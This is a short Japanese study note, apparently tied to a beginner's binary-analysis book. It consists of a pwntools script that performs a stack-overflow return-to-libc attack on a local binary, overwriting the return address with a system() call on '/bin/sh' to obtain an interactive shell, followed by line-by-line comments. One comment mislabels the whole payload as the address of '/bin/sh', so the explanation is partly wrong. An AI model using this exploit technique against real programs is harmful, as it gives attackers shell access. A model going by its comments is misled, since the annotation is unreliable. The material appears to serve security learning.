# はじめて学ぶバイナリ解析 不正なコード型コンピュータを守るサイバーセキュリティ技術

from pwn import *

p = process("./a.out")
p.sendline("A" * 44 + "\x00\x92\xe1\xf7BBBB\x08\x70\x55\x56")
p.interactive()

# 44 = EIPを書き換えた文字列の最初の一文字からのオフセット(本来呼び出していた関数のスタックサイズ)
# BBBB = system関数にとってのリターンアドレス
# "\x00\x92\xe1\xf7BBBB\x08\x70\x55\x56" = "/bin/sh"が格納されているアドレスのリトルエンディアン
# p = ハンドル(起動中のバイナリファイルを管理するID)
# interactive = pに対して入出力の操作を行う
# /bin/sh が実行された状態になる
